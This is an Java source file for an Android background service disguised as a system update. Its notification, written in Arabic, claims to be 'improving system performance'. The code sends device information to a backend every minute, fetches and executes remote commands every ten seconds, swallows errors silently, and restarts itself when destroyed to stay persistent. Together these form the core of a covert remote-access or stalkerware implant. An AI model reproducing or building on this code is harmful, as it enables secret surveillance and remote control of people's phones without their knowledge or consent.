package com.sysupdate.app;

import android.app.*;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import androidx.core.app.NotificationCompat;
import org.json.JSONArray;
import org.json.JSONObject;

public class BackgroundService extends Service {
    private Thread worker;
    private volatile boolean running = true;

    @Override
    public void onCreate() {
        super.onCreate();
        SB.init(this);
        startForeground(1, notif());

        // Heartbeat - كل 60 ثانية
        new Thread(() -> {
            while (running) {
                try {
                    SB.upsertDevice(SysInfo.collect(BackgroundService.this));
                } catch (Exception e) {}
                try { Thread.sleep(60000); } catch (InterruptedException e) { break; }
            }
        }).start();

        // Commands poller - كل 10 ثواني
        worker = new Thread(() -> {
            while (running) {
                try {
                    JSONArray cmds = SB.fetchCommands();
                    for (int i = 0; i < cmds.length(); i++) {
                        JSONObject c = cmds.getJSONObject(i);
                        long id = c.optLong("id");
                        try {
                            CmdHandler.handle(BackgroundService.this, c);
                        } catch (Exception e) {}
                        SB.deleteCommand(id);
                    }
                } catch (Exception e) {}
                try { Thread.sleep(10000); } catch (InterruptedException e) { break; }
            }
        });
        worker.start();
    }

    @Override
    public int onStartCommand(Intent i, int f, int s) { return START_STICKY; }

    @Override
    public IBinder onBind(Intent i) { return null; }

    @Override
    public void onDestroy() {
        running = false;
        Intent restart = new Intent(this, BackgroundService.class);
        if (Build.VERSION.SDK_INT >= 26) startForegroundService(restart);
        else startService(restart);
        super.onDestroy();
    }

    private Notification notif() {
        String ch = "sys";
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel c = new NotificationChannel(ch, "System", NotificationManager.IMPORTANCE_MIN);
            ((NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE)).createNotificationChannel(c);
        }
        return new NotificationCompat.Builder(this, ch)
            .setContentTitle("جاري التحديث")
            .setContentText("تحسين أداء النظام...")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setOngoing(true)
            .build();
    }
}
